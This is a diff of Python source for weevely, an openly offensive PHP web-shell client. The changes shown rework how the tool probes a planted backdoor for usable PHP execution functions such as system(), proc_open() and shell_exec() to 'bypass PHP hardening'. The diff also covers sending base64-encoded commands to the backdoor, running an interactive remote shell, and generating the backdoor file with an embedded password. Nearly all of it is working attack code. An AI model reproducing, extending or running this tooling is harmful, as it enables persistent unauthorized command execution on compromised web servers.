@@ -7,9 +7,6 @@ import getopt, sys, base64, os, urllib2, re, urlparse, os
     
 methods= [ "system()", "passthru()", "popen()", "exec()", "proc_open()", "shell_exec()", "pcntl_exec()", "perl->system()", "python_eval()" ]
 
-def crypt(text):
-  return base64.b64encode(text)
-    
 class weevely:
   
   modules = {}
@@ -19,7 +16,7 @@ class weevely:
     self.banner()
     self.loadmodules()
   
-    escape=0
+    escape=-1
     
     try:
 	opts, args = getopt.getopt(sys.argv[1:], 'ltgsm:c:u:p:o:e:', ['list', 'module', 'generate', 'url', 'password', 'terminal', 'command', 'output', 'escape'])
@@ -41,12 +38,15 @@ class weevely:
 	  modul=a
 	  moderun='m'
 	if o in ("-e", "-escape"):
-	  a = int(a)
-	  if a>0 and a<9 and a%1==0:
+	  try:
 	    escape=int(a)
-	  else:
+	    if escape<0 or escape>8 or escape%1!=0:
+	      print "- Error: escape method is not a valid integer"
+	      return
+	  except ValueError:
 	    print "- Error: escape method is not a valid integer"
-	    sys.exit(1)
+	    return
+
 	
 	if o in ("-s", "-show"):
 	  escape=-1
@@ -87,12 +87,14 @@ class weevely:
 	  sys.exit(1)
 	  
 	try:
-	  self.host=host(url,pwd,escape)
+	  self.host=host(url,pwd)
 	except Exception, e:
-	  print "! Error: " + str(e) + ". Exiting."
-	  raise
-	  sys.exit(1)
-	  
+	  print "! Error executing remote PHP code: " + str(e) + ". Exiting."
+	  return
+	
+	if moderun=='s':
+	  if self.host.checkexecution(-2)<0:
+	    return
 
       if moderun=='g':
 	if 'pwd' not in locals():
@@ -109,6 +111,8 @@ class weevely:
 
       if moderun=='c':       
 	try:
+	  if self.host.checkexecution(escape)<0:
+	    return
 	  print self.host.execute(cmnd)
 	except Exception, e:
 	  #print '! Command execution failed: ' + str(e) + '.'
@@ -116,6 +120,8 @@ class weevely:
 	return
 
       if moderun=='t':
+	if self.host.checkexecution(escape)<0:
+	  return
 	self.terminal(url,pwd)
       if moderun=='g':
 	self.generate(pwd,outfile)
@@ -153,7 +159,7 @@ class weevely:
     
     while True:
       print hostname + '> ',
-      cmnd = sys.stdin.readline()
+      cmnd = sys.stdin.readline().strip()
       if cmnd!='\n':
 	print self.host.execute(cmnd)
 
@@ -164,7 +170,7 @@ class weevely:
     
     str_tocrypt = f_tocrypt.read()
     new_str_tocrypt = str_tocrypt.replace('%%%START_KEY%%%',key[:2]).replace('%%%END_KEY%%%',key[2:]).replace('\n','')
-    str_crypted = crypt(new_str_tocrypt)
+    str_crypted = base64.b64encode(new_str_tocrypt)
     str_back = f_back.read()
     new_str = str_back.replace('%%%BACK_CRYPTED%%%', str_crypted)
     
@@ -275,16 +281,16 @@ class weevely:
 class host():
   
   
-  def __init__(self,url,pwd,escape):
+  def __init__(self,url,pwd):
     self.url=url
     self.pwd=pwd
     self.method=-1
 
-    os = self.checkbackdoor(escape)
+    os = self.checkbackdoor()
     
     self.os=os
 
-  def checkbackdoor(self, escape):
+  def checkbackdoor(self):
     
     os = None
     
@@ -294,54 +300,65 @@ class host():
     except Exception, e:
       raise
 
+    return os
+
+  def checkexecution(self, escape = -1):
+
     sum_ok = []
     sum_no = {}
 
-    if escape == -1:
+     
+    if escape < 0:
+      print "+ Testing functions to bypass PHP hardening..."
+      ran = range(0,9)
+    else:
+      print "+ Testing function " + methods[escape] + " to bypass PHP hardening..."
+      ran = [ escape ]
       
-      print "+ Testing functions to bypass PHP hardening. Choose one of accepted with -e <number>."
-      
-      first=-1
-      for i in range(0,9):
-	try:
-	  ret = self.execute("echo " + self.pwd, i)
-	  if(ret==self.pwd):
-	    sum_ok.append(methods[i])
-	    first=i
-	  else:
-	    sum_no[methods[i]]=ret
-	    #print '- Escape ' + str(i) + ' unexpected response ' + ret
-	except Exception, e:
-	  sum_no[methods[i]]='Remote PHP error: ' + ret
-	  #print '- Escape ' + str(i) + ' invalid response: ' + ret +')'
+    first=-1
+    ret=''
+    for i in ran:
+      try:
+	ret = self.execute("echo " + self.pwd, i)
+	if(ret==self.pwd):
+	  sum_ok.append(methods[i])
+	  first=i
+	else:
+	  sum_no[methods[i]]=ret
+	  #print '- Escape ' + str(i) + ' unexpected response ' + ret
+      except Exception, e:
+	sum_no[methods[i]]='Remote PHP error: ' + ret + " " + str(e)
+	#print '- Escape ' + str(i) + ' invalid response: ' + ret +')'
 
+
+    # Summary 
+    
+    if len(sum_ok)>0 and escape==-2:
       print "+ Accepted functions:",
       for m in sum_ok:
 	  print  str(methods.index(m)) + " [" + m + "]", 
       print ''
 	  
-      if len(sum_no)>0:
-	print "- Failed functions: ",
-	for m in sum_no:
-	  print  str(methods.index(m)) + " [" + m + "]", 
-	print ''  
-	  
+    if first == -1 or ( len(sum_no)>0 and escape==-2 ):
+      print "- Unsupported functions: ",
+      for m in sum_no:
+	print  str(methods.index(m)) + " [" + m + "]", 
+      print ''  
+	
 
-      if first==-1:
-	print '+ No working escape function founded.'
-      else:
-	self.method = first
-    
+    if first==-1:
+      print '! No working functions founded on ' + self.url + '. Exiting.'
+      return None
     else:
-      self.method = escape
-      print '+ Weeveling ' + self.url + ' with ' + methods[escape] + '.' 
-    
-    return os
+      self.method = first
+      if escape != -2:
+	print '+ Using with method ' + str(first) + ' (' + methods[first] + ').' 
+      return first
 
   def execute_php(self,cmnd):
     
     cmnd=cmnd.strip()
-    cmdstr=crypt(cmnd)
+    cmdstr=base64.b64encode(cmnd)
     
     
     # http://www.google.com/url?sa=t&source=web&ct=res&cd=7&url=http%3A%2F%2Fwww.example.com%2Fmypage.htm&ei=0SjdSa-1N5O8M_qW8dQN&rct=j&q=flowers&usg=AFQjCNHJXSUh7Vw7oubPaO3tZOzz-F-u_w&sig2=X8uCFh6IoPtnwmvGMULQfw
@@ -357,7 +374,7 @@ class host():
       e = re.compile(restring,re.DOTALL)
       founded=e.findall(ret)
       if len(founded)<1:
-	raise Exception('Invalid response. Wrong password, url or backdoor not installed correctly.')
+	raise Exception('Invalid response.')
       else:
 	return founded[0].strip()
 
@@ -379,7 +396,7 @@ class host():
     elif(met==4):
       cmnd = "$p = array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w')); $h = proc_open('" + cmnd + "', $p, $pipes); $r = stream_get_contents ($pipes[1]); echo $r . stream_get_contents($pipes[2]); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($h);" 
     elif(met==5):
-      cmnd="shell_exec('" + cmnd + " 2>&1');"
+      cmnd="echo shell_exec('" + cmnd + " 2>&1');"
     elif(met==6):
       cmnd="$u = array('" + "','".join(cmnd.split(' ')[1:]) + "'); pcntl_exec('" + cmnd.split()[0] + "', $u);"
     elif(met==7):
